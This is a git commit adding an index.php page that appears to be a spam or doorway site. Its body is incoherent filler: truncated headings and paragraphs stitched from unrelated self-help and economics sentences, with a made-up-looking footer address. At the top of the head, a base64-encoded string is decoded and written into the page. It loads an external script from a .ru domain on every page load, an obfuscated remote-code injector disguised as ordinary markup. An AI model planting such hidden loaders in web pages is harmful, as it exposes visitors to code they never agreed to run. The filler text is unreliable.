65c604a460f6372166fd4c560988d89e1f838b22
qeayzslv <79971061+qeayzslv@users.noreply.github.com>
2021-03-03 11:22:59 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl85NTFxZmhod2RqaXZsNm13M2wiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>My money will serve me, not dominate me.  Demand for essential goods is inelastic.  Econo</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="pvkcf95yp77cmd1jq">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="ssudblxq0ovgp2mqbnk">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>My money will serve me, not dominate me.  Demand for essential goods is inelastic.  Econo</h1>
+	</section>
+
+
+	<section class="our-work" class="5lwpywh115b7o8ciu056mo8">
+		<h3 class="title">And in such an atmosphere, synergy is not possible.</h3>
+		<p>I must go.- But why did you turn this person into the center of your life? I asked.  Children will feel this and the rest will be ruined.  I have spare at home; take, wear these! You put on glasses, but you see even worse in them.  What do you think will be the natural consequence of skipping classes? “But you won't exclude me, will you? - It would be a social - artificial consequence.  We saw in him endless layers of possibilities that had to be realized in accordance with his own life rhythm.  If these goals are the development of your Personal Mission, based on correct principles, then they will be fundamentally different from the goals that people usually set for themselves.  It is possible to live for years with chronic pain caused by a lack of vision, leadership, or control in our personal lives.  It doesn't matter to them.  But all these approaches require additional information and in themselves say little.  If this is so, then why then waste time and nerves on such senseless operations? A few centuries ago, economists came to the conclusion that in the conditions of voluntary and fair exchange, trade is a mutually beneficial business for its participants.At the same time, the cost side of the exchange really remains equal.  But I would not like that.  "Win / Win or Not to Tangle" If both parties do not come to a synergistic solution, thenwith which they both agree - they can take as a basis the principle representing the higher level of the position "Win / Win" - "Win / Win or Do not mess". </p>
+		<hr>
+
+		<ul class="grid" class="itjnmlpglv2se0orjfh1p">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pvkcf95yp77cmd1jq">
+		<h3 class="title">At the same time, military appropriations </h3>
+		<p>Everything that Potiphar owned was under his supervision, since his trust in Joseph was very great.  As it turned out, David rushed to the bathtub for a wet towel.But at this time his sister Maria was taking a shower and did not want to open the door.  16.  When an organization neglects any one or more of these areas,this negatively affects the entire organization as a whole.  - It seemed to me that the goal was to find an approach to solving the problem, so that the further work could be entrusted to the performers.  - But since you yourself are not talking specifically, I only have to act by exclusion.  Their relationship, as it continues to deteriorate, can lead to hostility and the need to defend.  So, at point A, the consumer has 10 units.  Habits are powerful factors in our lives.  Money plays the role of an intermediary, allowing to bridge the gap in time and space and to ensure the continuity of the production process.  You make decisions that must harm your enemies. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ssudblxq0ovgp2mqbnk" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="5lwpywh115b7o8ciu056mo8">
+		<h3 class="title">At one of my seminars, where I talked about the concept of proa</h3>
+		<p>However, despite a number of positive developments, tax legislation contains the following serious shortcomings.  1.  But increasing the driving forces alone is not enough.  When applied to an organization, the physical dimension is expressed in economic terms.  He creates a balance between the desire to see the room cleaned and building a relationship with the child in which he does it himself - readily, easily,without any coercion from the outside.  Empathic listening means much more than registering, reflecting, or even understanding the words being spoken.  They represent a system of principles on which happiness and success are based. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="itjnmlpglv2se0orjfh1p" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="pvkcf95yp77cmd1jq">
+		<h3 class="title">This means that the market creates constant economi</h3>
+		<p>The duration of the average period of unemployment decreases compared to the normal value.  He acted in the center of his Circle of Influence.  My friend's hands went up and down, up and down.  Most of the bank's executives simply could not believe in the success.  2.  Personal Mission Statement The most effective way I know to begin with the ultimate goal is to develop a personal mission statement, or personal philosophy, or creed. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ssudblxq0ovgp2mqbnk" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="5lwpywh115b7o8ciu056mo8">
+		<h3 class="title">Distinguish between individual and aggrega</h3>
+		<p>I recently completed another revision of my Personal Mission.  The soul of intrapersonal synergy is embodied in the principles of the first three skills, which endow a person with internal security sufficient to open up and not be afraid of being vulnerable.  We can "take a pose" in front of someone who does not know us well, or in front of a colleague.We can pretend.  It is not in the possession of material values, it is in the ability to produce material values.  But if you are making a decision based on a principle-centered paradigm, your choice has several important characteristics.  This means that the market creates constant economic incentives for commodity producers, encourages them to reduce the individual costs of producing a product, which ensures their stable position in the market.  He slowly, calmly and gradually set out everything he wanted.  state, enterprises and population.  We presented them with the newly developed additional goals and criteria and said: - As we expected, management wants to set additional goals for you with even more stringent criteria than before.  All resources cannot participate in production in isolation.They only interact in certain combinations.  You did not evaluate, question, advise, or interpret.  This technique is slightly more effective, but is still limited to only verbal communication.  Your predecessor destroyed the machine, but the accounting system only informs about the number of products produced, costs and income.  At the same time, the seller is given the opportunity to choose the most suitable buyer. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="itjnmlpglv2se0orjfh1p" class="title">We must exercise common sense when designing our exercise progr</h3>	
+		<p>Production requires certain resources that are used in the right combinations.  Every part of your life - what you do today, what you will do tomorrow, next week, next month - can be viewed in the context of a whole, thatwhat really matters to you.  Situations will surely arise where you, as a principled person, will have to subordinate your plan to a higher value with the same care with which you planned your week.And since principles are at the center of your life, you can do it with peace of mind.  The half-year program was thus reduced to five weeks and delivered significantly better results.  This method is based on a paradigm that recognizes self-awareness, imagination, conscience, and the free will of others.  Why can't I teach them to be independent and responsible? Or maybe it is worth looking for others who have such qualities? The Ethics of Personality tells methat I must take some decisive action - I need to shake my subordinates, to wiggle their brains, so that they get in shape and appreciate what they have.  Indirect factors: 1) policy.  Beginning with the ultimate goal is to approach your parenting role, as well as your other roles in life, with a clear understanding of your values ​​and direction.  In the graph, fixed costs are depicted as a horizontal line parallel to the abscissa (Fig.  The paradigm of determinism is the result of studying the behavior of animals - rats, monkeys, pigeons, dogs - as well as people with abnormalities in the nervous or mental system.  - “I am a warship! Change course 20 degrees! " There was an answer in light morse: - I am a beacon! We've changed course. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="pvkcf95yp77cmd1jq">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="ssudblxq0ovgp2mqbnk"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="5lwpywh115b7o8ciu056mo8"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="itjnmlpglv2se0orjfh1p"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>3657 Jerry Gateway, Apt. 284, 94985-7796, East Damionville, Maryland, United States</p>
+		<p>Phone number: +20(09)743-13-12928</p>
+	</footer>
+
+</body>
+
+</html>
